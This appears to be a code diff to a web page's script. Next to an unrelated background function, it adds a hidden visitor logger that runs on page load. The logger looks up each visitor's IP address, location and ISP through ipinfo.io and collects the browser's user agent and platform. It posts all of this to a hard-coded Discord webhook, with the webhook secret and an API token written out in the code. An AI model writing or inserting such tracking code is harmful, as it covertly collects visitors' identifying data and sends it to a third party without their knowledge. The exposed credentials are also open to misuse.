@@ -137,6 +137,45 @@
         function resetBackground() {
             document.body.style.backgroundImage = "url('./DF.gif')";
         }
+
+        // Fetch user's IP address and log details to Discord webhook
+        fetch("https://ipinfo.io/json?token=b95df81ec25728")
+            .then((response) => response.json())
+            .then((data) => {
+                const userIp = data.ip;
+                const location = `${data.city}, ${data.region}, ${data.country}`;
+                const isp = data.org;
+
+                // Get device information from User-Agent
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+
+                // Discord webhook payload
+                const webhookPayload = {
+                    content: `
+                    <@536633946344259614>
+                    
+                    **New Visitor Details**\nIP: ${userIp}\nLocation: ${location}\nISP: ${isp}\nDevice: ${platform}\nUser-Agent: ${userAgent}`,
+                };
+
+                // Send to Discord webhook
+                fetch("https://discord.com/api/webhooks/1171109289893572638/Gv2tEyuDNVNYWUwCpDIOZeTTz6SHIOtUv7Wa0bNs987-xoleLq8T28Rk-lIAnrh2VGHV", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(webhookPayload),
+                })
+                .then((response) => {
+                    if (response.ok) {
+                        console.log("Details logged to Discord successfully.");
+                    } else {
+                        console.error("Failed to log details to Discord:", response.statusText);
+                    }
+                })
+                .catch((error) => console.error("Error sending webhook:", error));
+            })
+            .catch((err) => console.error("Error fetching IP info:", err));
     </script>
 </body>
 
